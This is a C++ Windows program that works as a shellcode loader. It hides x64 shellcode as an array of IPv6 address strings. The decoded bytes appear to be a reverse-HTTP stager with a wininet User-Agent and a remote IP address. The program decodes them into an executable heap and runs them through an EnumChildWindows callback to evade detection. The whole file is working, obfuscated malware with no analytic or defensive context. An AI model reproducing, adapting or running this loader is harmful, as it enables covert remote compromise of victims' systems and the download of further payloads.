#include <Windows.h>
#include <iostream>
#include <ip2string.h>
#pragma comment(lib, "Ntdll.lib")


const char* ipv6[] =
{
    "fc48:83e4:f0e8:c800:0:4151:4150:5251", "5648:31d2:6548:8b52:6048:8b52:1848:8b52", "2048:8b72:5048:fb7:4a4a:4d31:c948:31c0", "ac3c:617c:22c:2041:c1c9:d41:1c1:e2ed", "5241:5148:8b52:208b:423c:4801:d066:8178", "180b:275:728b:8088:0:48:85c0:7467", "4801:d050:8b48:1844:8b40:2049:1d0:e356", "48ff:c941:8b34:8848:1d6:4d31:c948:31c0", "ac41:c1c9:d41:1c1:38e0:75f1:4c03:4c24", "845:39d1:75d8:5844:8b40:2449:1d0:6641", "8b0c:4844:8b40:1c49:1d0:418b:488:4801", "d041:5841:585e:595a:4158:4159:415a:4883", "ec20:4152:ffe0:5841:595a:488b:12e9:4fff", "ffff:5d6a:49:be77:696e:696e:6574:41", "5649:89e6:4c89:f141:ba4c:7726:7ff:d548", "31c9:4831:d24d:31c0:4d31:c941:5041:5041", "ba3a:5679:a7ff:d5e9:9300:0:5a48:89c1", "41b8:bb01:0:4d31:c941:5141:516a:341", "5141:ba57:899f:c6ff:d5eb:795b:4889:c148", "31d2:4989:d84d:31c9:5268:32:c084:5252", "41ba:eb55:2e3b:ffd5:4889:c648:83c3:506a", "a5f:4889:f1ba:1f00:0:6a00:6880:3300", "49:89e0:41b9:400:0:41ba:7546:9e86", "ffd5:4889:f148:89da:49c7:c0ff:ffff:ff4d", "31c9:5252:41ba:2d06:187b:ffd5:85c0:f85", "9d01:0:48ff:cf0f:848c:100:eb:b3e9", "e401:0:e882:ffff:ff2f:4c70:5849:df", "e655:bc7:b19:4db4:748f:689:8a62:178f", "c28a:c821:a01b:2e3f:f9cf:4b32:72e2:e974", "2d6c:32f5:d20e:cab1:8a0a:c6f2:f8ec:e05c", "805e:8662:248d:a10:51d6:daaf:84ce:8a8a", "a7fa:7818:97bc:b050:55:7365:722d:4167", "656e:743a:204d:6f7a:696c:6c61:2f35:2e30", "2028:636f:6d70:6174:6962:6c65:3b20:4d53", "4945:2031:302e:303b:2057:696e:646f:7773", "204e:5420:362e:323b:2057:4f57:3634:3b20", "5472:6964:656e:742f:362e:303b:204d:4147", "574a:5329:d0a:ce:758d:fb7d:dbd6:51b", "cbc5:45fa:7e21:5fe5:c30b:88f3:22f4:2bf7", "55fa:5c6e:bdde:3199:bbef:1a1e:eeb9:3ab1", "56bc:b146:5680:b3f1:7b88:93a2:767a:5995", "4a67:62d:cb36:b251:8583:b8fc:5957:e85b", "2157:a21f:c05f:310:e185:4b0:60e6:e7a7", "9852:3240:4447:db61:b711:425a:f220:6b7", "c69a:26ed:5e9a:fd87:9e73:66a9:e9f5:95c7", "7463:4d2d:ab13:f5:e680:f4:69c8:55de", "e69d:772c:b71c:af22:e9a7:fc1c:37e7:e9d6", "d18e:fe30:ae21:9fdd:e9dc:62bc:fdf2:6893", "ee61:4ce1:390e:cc6:37a3:e3a4:27b1:72ec", "b0f3:fb9c:7979:f560:7773:cdc5:7361:109", "b5c3:7570:a9b1:4ea2:41:bef0:b5a2:56ff", "d548:31c9:ba00:40:41:b800:1000:41", "b940:0:41:ba58:a453:e5ff:d548:9353", "5348:89e7:4889:f148:89da:41b8:20:0", "4989:f941:ba12:9689:e2ff:d548:83c4:2085", "c074:b666:8b07:4801:c385:c075:d758:5858", "4805::50c3:e87f:fdff:ff31:2e31", "352e:3830:2e31:3032:49:9602:d200:0"
};

typedef HANDLE(WINAPI* ImportHeapCreate)(
    _In_ DWORD flOptions,
    _In_ SIZE_T dwInitialSize,
    _In_ SIZE_T dwMaximumSize
    );

typedef LPVOID(WINAPI* ImportHeapAlloc)(
    _In_ HANDLE hHeap,
    _In_ DWORD dwFlags,
    _In_ SIZE_T dwBytes
    );

typedef NTSTATUS(NTAPI* ImportRtlIpv6StringToAddressA)(
    _In_ PCSTR S,
    _Out_ PCSTR* Terminator,
    _Out_ struct in6_addr* Addr
    );

typedef BOOL(WINAPI* ImportEnumChildWindows)(
    _In_opt_ HWND hWndParent,
    _In_ WNDENUMPROC lpEnumFunc,
    _In_ LPARAM lParam
    );




int main()
{
    ImportHeapCreate MyHeapCreate = (ImportHeapCreate)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "HeapCreate");
    ImportHeapAlloc MyHeapAlloc = (ImportHeapAlloc)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "HeapAlloc");
    
    HMODULE hModule = LoadLibraryA("ntdll.dll");
    ImportRtlIpv6StringToAddressA MyRtlIpv6StringToAddressA = (ImportRtlIpv6StringToAddressA)GetProcAddress(hModule, "RtlIpv6StringToAddressA");
    
    HMODULE hModule2 = LoadLibraryA("USER32.dll");
    ImportEnumChildWindows MyEnumChildWindows = (ImportEnumChildWindows)GetProcAddress(hModule2, "EnumChildWindows");


    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(ipv6) / sizeof(ipv6[0]);
    PCSTR Terminator = "";

    for (int i = 0; i < elems; i++) {

        if (MyRtlIpv6StringToAddressA(ipv6[i], &Terminator, (in6_addr*)hptr) == STATUS_INVALID_PARAMETER)
        {
            printf("ERROR!");
            return 0;
        }
        hptr += 16;
    }

    MyEnumChildWindows(NULL, (WNDENUMPROC)ha, 0);
    CloseHandle(ha);
    return 0;
}
